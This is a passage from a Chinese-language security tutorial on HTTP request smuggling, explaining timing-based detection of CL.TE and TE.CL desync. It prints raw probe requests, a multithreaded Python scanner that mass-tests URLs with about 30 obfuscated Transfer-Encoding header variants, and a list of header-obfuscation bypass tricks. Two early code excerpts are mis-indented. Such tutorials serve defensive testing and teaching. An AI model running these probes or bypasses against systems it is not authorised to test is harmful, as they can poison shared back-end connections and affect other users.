class="line">Q</span><br></pre></td></tr></table></figure><p>如果服务端是TE.CL类型，则由于无效的块大小“Q”，前端服务器就已经拒绝该请求而不会转发到后端服务器中。这样可以防止后端服务器Socket中毒。</p><p>代码实现如下，先判断CL为4时是否超时，若超时且CL为11时不超时，如果CL为4的响应时间大于5s且CL为4的请求响应时间远大于CL为11的响应时间，即可认为存在CL.TE型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">        payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">                t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">print</span> (t1, t2)</span><br><span class="line">                    <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                        self.valid = <span class="keyword">True</span></span><br><span class="line">                        self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                        self.headers_payload = [headers]</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="TE-CL型HRS扫描原理"><a href="#TE-CL型HRS扫描原理" class="headerlink" title="TE.CL型HRS扫描原理"></a>TE.CL型HRS扫描原理</h3><p>针对TE.CL型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>因为前端服务器使用TE解析，<code>0\r\n\r\n</code>代表chunked结束，所以后端服务器只会收到如下部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>而由于后端服务器使用CL解析，解析<code>Content-Length: 6</code>便会尝试获取请求报文中的6字节内容，而<code>0\r\n\r\n</code>只有5个字节，后端服务器会等待第6个字节直至超时。</p><p>如果服务端是CL.TE类型，则此检测方法将使X毒化后端服务器的请求，从而可能损害合法用户。但是我们可以通过先执行CL.TE类HRS的检测再执行TE.CL类HRS的检测来避免这个问题。</p><p>代码实现如下，通过判断CL为6超时、CL为5不超时来确定是存在TE.CL型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_TECL(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">                t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">                        <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                            self.valid = <span class="keyword">True</span></span><br><span class="line">                            self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                            self.headers_payload = [headers]</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="网上参考的脚本"><a href="#网上参考的脚本" class="headerlink" title="网上参考的脚本"></a>网上参考的脚本</h3><p>基于上面的基础，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: xph</span></span><br><span class="line"><span class="string">CreateTime: 2019-09-18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">http.client._is_legal_header_name = <span class="keyword">lambda</span> x: <span class="keyword">True</span></span><br><span class="line">http.client._is_illegal_header_value = <span class="keyword">lambda</span> x: <span class="keyword">False</span></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"res.txt"</span>, <span class="string">'a'</span>)</span><br><span class="line">fp.write(<span class="string">"\n"</span> + <span class="string">"-"</span> * <span class="number">50</span> + <span class="string">"\n"</span>)</span><br><span class="line">fp.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP_REQUEST_SMUGGLER</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.headers_payload = []</span><br><span class="line">        self.valid = <span class="keyword">False</span></span><br><span class="line">        self.type = <span class="string">""</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.Transfer_Encoding1 = [[<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding "</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer_Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">" Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"  chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Content-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">"\n chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding\n "</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \"chunked\""</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" 'chunked'"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\u000Bchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" \n\tchunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked, cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow, "</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r\nTransfer-encoding: cow"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunk"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"TrAnSFer-EnCODinG"</span>, <span class="string">" cHuNkeD"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"TRANSFER-ENCODING"</span>, <span class="string">" CHUNKED"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\r"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" chunked\t"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer-Encoding"</span>, <span class="string">" cow\r\nTransfer-Encoding: chunked"</span>],</span><br><span class="line">                                   [<span class="string">"Transfer\r-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   [<span class="string">"barn\n\nTransfer-Encoding"</span>, <span class="string">" chunked"</span>],</span><br><span class="line">                                   ]</span><br><span class="line"></span><br><span class="line">        self.Transfer_Encoding = list(self.Transfer_Encoding1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding1:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">" "</span> == x[<span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]:</span><br><span class="line">                    <span class="comment"># print (type(chr(i)))</span></span><br><span class="line">                    c = str(chr(i))</span><br><span class="line">                    self.Transfer_Encoding.append([x[<span class="number">0</span>], c + x[<span class="number">1</span>][<span class="number">1</span>:]])</span><br><span class="line"></span><br><span class="line">        self.payload_headers = []</span><br><span class="line">        self.n1 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.Transfer_Encoding:</span><br><span class="line">            headers = collections.OrderedDict()</span><br><span class="line">            headers[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">            headers[<span class="string">'Cache-Control'</span>] = <span class="string">"no-cache"</span></span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            headers[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span></span><br><span class="line">            self.payload_headers.append(headers)</span><br><span class="line">            self.n1 = self.n1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_CLTE</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            <span class="keyword">return</span> resp_time</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            resp_time = <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line">                <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_TECL</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            print(resp, resp_time)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                resp_time = <span class="number">10</span></span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(resp_time)</span></span><br><span class="line">        <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (t1, t2)</span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_TECL(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">            t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            h = &#123;</span><br><span class="line">                <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"</span>&#125;</span><br><span class="line">            requests.get(self.url, headers=h, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_CLTE():</span><br><span class="line">                self.check_TECL()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(<span class="string">"timeout: "</span> + self.url)</span><br><span class="line">        <span class="keyword">return</span> self.recheck()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"recheck"</span>)</span><br><span class="line">        print(self.valid, self.type)</span><br><span class="line">        <span class="keyword">if</span> self.valid:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="string">"CL-TE"</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_CLTE():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find CL-TE: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"CL-TE\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"CL-TE"</span>, payload]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_TECL():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find TE-CL: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"TE-CL\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"TE-Cl"</span>, payload]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(url)</span>:</span></span><br><span class="line">    a = HTTP_REQUEST_SMUGGLER(url)</span><br><span class="line">    print(a.run())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threadpool</span><br><span class="line">    iter_list = open(<span class="string">"urls.txt"</span>).read().split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">30</span>)</span><br><span class="line">    thread_requests = threadpool.makeRequests(func, iter_list)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> thread_requests]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line">func(<span class="string">"https://example.com"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x06-Bypass技巧"><a href="#0x06-Bypass技巧" class="headerlink" title="0x06 Bypass技巧"></a>0x06 Bypass技巧</h2><h3 id="混淆TE头"><a href="#混淆TE头" class="headerlink" title="混淆TE头"></a>混淆TE头</h3><p>前面提到了一些混淆TE头的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: 